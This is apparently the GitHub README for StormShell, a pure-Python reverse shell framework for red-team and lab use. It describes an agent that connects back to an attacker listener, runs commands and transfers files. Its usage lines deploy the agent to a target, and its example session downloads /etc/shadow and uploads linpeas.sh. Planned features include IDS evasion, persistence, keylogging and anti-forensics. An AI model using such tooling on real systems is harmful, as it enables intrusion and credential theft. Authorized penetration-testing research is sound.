<p align="center">
  <img src="https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python">
  <img src="https://img.shields.io/badge/Platform-Cross--Platform-brightgreen?style=for-the-badge" alt="Platform">
  <img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge" alt="License">
  <img src="https://img.shields.io/badge/Purpose-Educational-red?style=for-the-badge" alt="Purpose">
</p>

```
   _____ __                        _____ __         ____
  / ___// /_____  _________ ___   / ___// /_  ___  / / /
  \__ \/ __/ __ \/ ___/ __ `__ \  \__ \/ __ \/ _ \/ / / 
 ___/ / /_/ /_/ / /  / / / / / / ___/ / / / /  __/ / /  
/____/\__/\____/_/  /_/ /_/ /_/ /____/_/ /_/\___/_/_/   
```

# StormShell

**A lightweight, resilient Reverse Shell framework built in pure Python — engineered for Red Team operations, penetration testing labs, and offensive security research.**

StormShell is not just another reverse shell script. It is a modular, production-grade framework designed with real-world operational constraints in mind: unreliable networks, dropped connections, and the need for covert file exfiltration. Every architectural decision — from the custom size-prefixed transfer protocol to the automatic reconnection engine — reflects the kind of engineering rigor expected in professional Red Team tooling.

---

## ⚠️ Disclaimer

> **This tool is developed strictly for educational purposes, authorized penetration testing, and security research within controlled lab environments.**
>
> Unauthorized access to computer systems is illegal and punishable under laws such as the **Computer Fraud and Abuse Act (CFAA)**, **EU Directive 2013/40/EU**, and equivalent legislation worldwide. The author assumes **no liability** for any misuse of this software. By using StormShell, you agree that you have **explicit written authorization** from the system owner before conducting any testing.
>
> **Use responsibly. Hack ethically.**

---

## 🔑 Core Features

| Feature | Description |
|---|---|
| **Interactive Remote Shell** | Full bidirectional command execution via TCP sockets. Operators type commands in a rich CLI prompt; the agent executes them on the target OS via `subprocess` and streams results back in real time. |
| **Dynamic Target-Aware Prompt** | Upon connection, the agent automatically fingerprints the target (username, hostname, OS kernel) and transmits this metadata to the listener. The CLI prompt dynamically updates to `[user@host (OS)] StormShell>`, providing instant situational awareness. |
| **Automatic Reconnection Engine** | The agent implements a persistent retry loop with configurable backoff (`RECONNECT_DELAY`). If the listener is offline or the network drops mid-session, the agent silently re-establishes the connection — no manual intervention required. |
| **Binary File Transfer Protocol** | A custom size-prefixed protocol enables reliable file upload (attacker → victim) and download (victim → attacker). Transfers use chunked I/O with `_recv_exact(n)` to guarantee data integrity over TCP streams. |
| **Persistent Directory Tracking** | The `cd` command is intercepted and handled via `os.chdir()` at the agent process level, ensuring directory changes persist across subsequent commands — unlike naive `subprocess` implementations. |
| **Graceful Lifecycle Management** | Both listener and agent implement layered `try-except` blocks with `socket.shutdown()` + `socket.close()` teardown sequences. `KeyboardInterrupt`, broken pipes, and abrupt disconnections are all handled without crashes or resource leaks. |
| **Session Re-Listening** | When a session ends, the listener does not exit. It returns to listening mode and waits for the next inbound connection — supporting multi-session workflows without restarts. |

---

## 🏗️ Architecture & Project Structure

```
StormShell/
│
├── stormshell.py              # Main entry point — CLI argument parser, banner, logging setup
│
├── server/
│   ├── __init__.py
│   └── listener.py            # TCP listener, system info handshake, interactive loop,
│                               # file transfer handlers, connection re-listening
│
├── agent/
│   ├── __init__.py
│   └── agent.py               # TCP client, system fingerprinting, subprocess execution,
│                               # file transfer handlers, auto-reconnection engine
│
├── .gitignore
└── README.md
```

### Connection Flow & Handshake

The connection lifecycle follows a strict sequence to ensure reliability and contextual awareness:

```
┌──────────────┐                                          ┌──────────────┐
│   LISTENER   │                                          │    AGENT     │
│  (Attacker)  │                                          │   (Victim)   │
└──────┬───────┘                                          └──────┬───────┘
       │                                                         │
       │  1. bind() + listen() on HOST:PORT                      │
       │◄────────────────────────────────────────────────────────│
       │                                                         │
       │  2. Agent connects via TCP                              │
       │◄────────────────────────────────────────────────────────│
       │                                                         │
       │  3. Agent sends system info:                            │
       │     "egetangoren@Mac.home|Darwin 25.3.0"                │
       │◄────────────────────────────────────────────────────────│
       │                                                         │
       │  4. Listener parses info → builds dynamic prompt        │
       │     [egetangoren@Mac.home (Darwin 25.3.0)] StormShell>  │
       │                                                         │
       │  5. Interactive command loop begins                     │
       │────────────────────────────────────────────────────────►│
       │     "whoami"                                            │
       │◄────────────────────────────────────────────────────────│
       │     "root"                                              │
       │                                                         │
       │  6. "exit" → graceful shutdown on both sides            │
       │────────────────────────────────────────────────────────►│
       │                                                         │
       │  7. Listener re-enters listen() for new connections     │
       │                                                         │
```

**System Info Payload Format:**

The agent collects target metadata using Python's standard library modules with exception-safe fallbacks:

| Data Point | Source Module | Fallback |
|---|---|---|
| Username | `getpass.getuser()` | `"unknown"` |
| Hostname | `socket.gethostname()` | `"unknown"` |
| OS Info | `platform.system()` + `platform.release()` | `"Unknown OS"` |

Wire format: `<username>@<hostname>|<os_info>` (UTF-8 encoded string).

---

## 📡 Custom File Transfer Protocol

StormShell implements a **Size-Prefixed Binary Transfer Protocol** to handle reliable file transfers over raw TCP sockets. This design was chosen over delimiter-based approaches (e.g., EOF markers) because binary files may contain any byte sequence, making delimiters unreliable.

### Protocol Specification

**Header:** Fixed `16-byte` ASCII string containing the zero-padded file size in bytes.

```
┌────────────────────────┬─────────────────────────────────────┐
│   HEADER (16 bytes)    │         PAYLOAD (N bytes)           │
│  "0000000000001234"    │  <raw binary file data in chunks>   │
└────────────────────────┴─────────────────────────────────────┘
```

### Download Flow (Victim → Attacker)

```
Listener                              Agent
   │                                     │
   │  sendall("download /etc/passwd")    │
   │────────────────────────────────────►│
   │                                     │  Read file into memory
   │                                     │  Calculate file size
   │    16-byte header: "0000000000002048" │
   │◄────────────────────────────────────│
   │    Chunk 1: bytes[0:4096]           │
   │◄────────────────────────────────────│
   │    Chunk 2: bytes[4096:8192]        │  (if file > 4096 bytes)
   │◄────────────────────────────────────│
   │    ...until all N bytes received    │
   │                                     │
   │  Write to local file (basename)     │
   │                                     │
```

### Upload Flow (Attacker → Victim)

```
Listener                              Agent
   │                                     │
   │  sendall("upload payload.sh")       │
   │────────────────────────────────────►│
   │                                     │
   │         "READY" (ACK signal)        │
   │◄────────────────────────────────────│
   │                                     │
   │  16-byte header: "0000000000000512" │
   │────────────────────────────────────►│
   │  Chunk 1: bytes[0:512]             │
   │────────────────────────────────────►│
   │                                     │  Write to local file
   │  "[+] Upload received (512 bytes)" │
   │◄────────────────────────────────────│
   │                                     │
```

### Error Handling Protocol

When the agent cannot read the requested file (not found, permission denied, etc.), it sends an **error header** instead of a size header:

```
┌────────────────────────┬──────────────────────────────────────┐
│  ERROR HEADER (16 B)   │       ERROR MESSAGE (M bytes)        │
│  "ERROR:35        "    │  "[!] File not found: /etc/shadow"   │
└────────────────────────┴──────────────────────────────────────┘
```

The listener detects the `ERROR:` prefix, reads exactly `M` bytes of error message, prints it, and **continues the interactive loop without breaking the connection**.

### TCP Stream Integrity: `_recv_exact(n)`

TCP is a **stream protocol** — a single `recv()` call may return fewer bytes than requested due to network fragmentation, Nagle's algorithm, or buffer boundaries. StormShell addresses this with a deterministic receive function:

```python
def _recv_exact(self, length: int) -> bytes:
    """Receive exactly 'length' bytes from the socket."""
    data = b""
    while len(data) < length:
        chunk = self.sock.recv(min(BUFFER_SIZE, length - len(data)))
        if not chunk:
            raise ConnectionError("Connection closed during transfer.")
        data += chunk
    return data
```

This guarantees that:
- **Headers are always exactly 16 bytes** — no partial reads.
- **File payloads are received in full** — no truncated writes.
- **Empty `recv()` (peer disconnect)** raises a clear exception instead of silently corrupting data.

---

## 📦 Installation & Prerequisites

### Requirements

- **Python 3.10+** (uses `type | None` union syntax)
- **No external dependencies** — built entirely on Python's standard library (`socket`, `subprocess`, `os`, `platform`, `getpass`, `argparse`, `logging`)

### Setup

```bash
# Clone the repository
git clone https://github.com/egetangoren/StormShell.git
cd StormShell

# Create and activate a virtual environment (recommended)
python3 -m venv .venv
source .venv/bin/activate        # Linux / macOS
# .venv\Scripts\activate         # Windows

# No pip install needed — zero dependencies!
```

---

## 🚀 Usage Guide

### 1. Start the Listener (Attacker Machine)

```bash
# Default: 127.0.0.1:4444
python3 stormshell.py

# Custom host and port
python3 stormshell.py --host 0.0.0.0 --port 8080

# Verbose mode (DEBUG-level logging)
python3 stormshell.py --host 0.0.0.0 --port 8080 -v
```

**CLI Options:**

| Flag | Default | Description |
|---|---|---|
| `--host` | `127.0.0.1` | IP address to bind the listener to |
| `--port` | `4444` | TCP port to listen on |
| `-v, --verbose` | `False` | Enable DEBUG-level logging output |

### 2. Deploy the Agent (Target Machine)

```bash
# Default: connects to 127.0.0.1:4444
python3 agent/agent.py

# Custom listener address
python3 agent/agent.py --host 192.168.1.100 --port 8080

# Verbose mode
python3 agent/agent.py --host 192.168.1.100 --port 8080 -v
```

> **Note:** The agent will automatically retry every 5 seconds if the listener is not yet running. You can start the agent before or after the listener — order does not matter.

### 3. Interactive Session Commands

Once connected, the dynamic prompt appears:

```
[egetangoren@Mac.home (Darwin 25.3.0)] StormShell>
```

**Available Commands:**

| Command | Description | Example |
|---|---|---|
| `<any shell command>` | Execute on the target OS via subprocess | `whoami`, `ls -la`, `cat /etc/passwd` |
| `cd <path>` | Change the agent's working directory (persistent) | `cd /tmp`, `cd ..`, `cd` (home) |
| `download <remote_path>` | Download a file from the target to attacker | `download /etc/hosts` |
| `upload <local_path>` | Upload a local file to the target machine | `upload payload.sh` |
| `exit` | Gracefully shut down the agent and end the session | `exit` |

### 4. Example Session

```
   _____ __                        _____ __         ____
  / ___// /_____  _________ ___   / ___// /_  ___  / / /
  \__ \/ __/ __ \/ ___/ __ `__ \  \__ \/ __ \/ _ \/ / / 
 ___/ / /_/ /_/ / /  / / / / / / ___/ / / / /  __/ / /  
/____/\__/\____/_/  /_/ /_/ /_/ /____/_/ /_/\___/_/_/   
    
  [ StormShell — Reverse Shell Handler ]

[*] Listening on 0.0.0.0:4444 ...

[+] Connection received from 192.168.1.42:51023
[+] Target: victim@webserver (Linux 5.15.0)
[*] Interactive session started. Type 'exit' to quit.

[victim@webserver (Linux 5.15.0)] StormShell> whoami
root

[victim@webserver (Linux 5.15.0)] StormShell> id
uid=0(root) gid=0(root) groups=0(root)

[victim@webserver (Linux 5.15.0)] StormShell> cd /etc
[+] Changed directory to: /etc

[victim@webserver (Linux 5.15.0)] StormShell> download shadow
[+] Downloaded 'shadow' → 'shadow' (1,247 bytes)

[victim@webserver (Linux 5.15.0)] StormShell> upload linpeas.sh
[+] Upload received: 'linpeas.sh' (827,340 bytes)

[victim@webserver (Linux 5.15.0)] StormShell> exit
[*] Exit command sent. Closing session …

[*] Session ended. Waiting for new connection ...
```

---

## 🛡️ Error Handling & Resilience Strategy

StormShell implements a **defense-in-depth** error handling strategy across both the listener and the agent:

| Failure Scenario | Listener Behavior | Agent Behavior |
|---|---|---|
| Listener not running | — | Retries every `RECONNECT_DELAY` seconds (default: 5s) |
| Network drops mid-session | Detects empty `recv()`, closes client, re-listens | Detects `ConnectionResetError`, reconnects automatically |
| Invalid command output | Safely decodes with `errors="replace"` | Returns `stderr` merged with `stdout` |
| `cd` to nonexistent path | — | Returns `[!] Directory not found` without crashing |
| File not found (download) | Receives `ERROR:` header, prints message, continues | Sends error header, connection remains alive |
| Command timeout (>30s) | — | `subprocess.TimeoutExpired` caught, returns timeout message |
| `Ctrl+C` (operator) | Sends `exit` to agent, closes all sockets | Catches `KeyboardInterrupt`, clean shutdown |
| `SO_REUSEADDR` | Prevents `Address already in use` on quick restarts | — |

---

## 🧬 Technical Decisions & Design Rationale

| Decision | Rationale |
|---|---|
| **`shell=True` in subprocess** | Enables shell builtins (`|`, `>`, `&&`) and environment variable expansion — critical for real-world shell interaction. |
| **`os.chdir()` for `cd`** | `subprocess.run("cd /tmp", shell=True)` only changes the directory for that child process. `os.chdir()` persists the change in the agent's parent process. |
| **Size-prefixed protocol over delimiters** | Binary files can contain any byte sequence. A fixed-size header guarantees framing integrity without the risk of false-positive delimiter matches. |
| **16-byte zero-padded header** | Supports files up to ~9.99 petabytes (`9999999999999999` bytes). Fixed width simplifies parsing — always `recv(16)`. |
| **`_recv_exact(n)` helper** | TCP `recv()` may return partial data due to kernel buffer boundaries. This loop guarantees complete payload assembly. |
| **Agent-first system info** | Sending metadata before the command loop allows the listener to build contextual prompts without an extra round-trip request. |
| **Reconnection at agent level** | In real Red Team operations, the operator controls the listener. The agent must be self-healing — reconnecting autonomously without operator intervention. |
| **`SO_REUSEADDR` on listener** | Eliminates `TIME_WAIT` socket binding errors when rapidly restarting the listener during development or operations. |

---

## 📌 Commit History

| Commit | Message | Scope |
|---|---|---|
| `#1` | `feat: implement basic socket listener and connections handler` | Server |
| `#2` | `feat: implement basic agent socket client` | Agent |
| `#3` | `feat: establish interactive command transmission loop` | Both |
| `#4` | `feat: add OS command execution using subprocess on agent` | Agent |
| `#5` | `feat: implement automatic reconnection loop for agent` | Agent |
| `#6` | `feat: implement file download and upload handlers` | Both |
| `#7` | `style: enhance CLI prompt with target info and finalize usage docs` | Both |

Each commit follows **Semantic Commit** conventions and was developed incrementally — every commit represents a fully functional, tested milestone.

---

## 🔮 Future Roadmap

StormShell is designed as a foundation that can be extended with advanced offensive capabilities. The following features are planned for future development:

| Priority | Feature | Description |
|---|---|---|
| 🔴 High | **AES-256 Encrypted Channel** | Wrap all TCP traffic in an AES-256-CBC (or GCM) encrypted tunnel using Python's `cryptography` library. This would prevent plaintext command/response interception by network monitoring tools (IDS/IPS). A key exchange handshake (Diffie-Hellman or pre-shared key) would be implemented during the initial connection phase. |
| 🔴 High | **XOR Obfuscation Layer** | As a lightweight alternative to full AES, implement a fast XOR cipher with a rotating key for environments where `cryptography` cannot be installed. Useful for evading basic signature-based detection. |
| 🟡 Medium | **Persistence Mechanisms** | Auto-install the agent as a persistent service on the target: crontab entries (Linux), Launch Agents (macOS), or Registry Run keys (Windows). The agent would survive reboots and user logouts. |
| 🟡 Medium | **Multi-Session Handler** | Upgrade the listener to manage multiple simultaneous agent connections using `select()` or `threading`. An operator menu would allow switching between active sessions (`sessions -l`, `interact 2`). |
| 🟢 Low | **Screenshot & Keylogger Modules** | Plugin-based architecture for optional modules: `screenshot` (capture target display), `keylog` (record keystrokes), and `sysinfo` (comprehensive system enumeration). |
| 🟢 Low | **SOCKS5 Proxy Pivoting** | Route traffic through the compromised host to reach internal network segments not directly accessible from the attacker's machine. |
| 🟢 Low | **Anti-Forensics & Evasion** | Process name spoofing, in-memory execution, timestomping on transferred files, and self-deletion capabilities to reduce forensic footprint. |

---

## 📄 License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

---

<p align="center">
  <b>Built with 🐍 Python | Engineered for Red Teams | Educational Use Only</b>
</p>
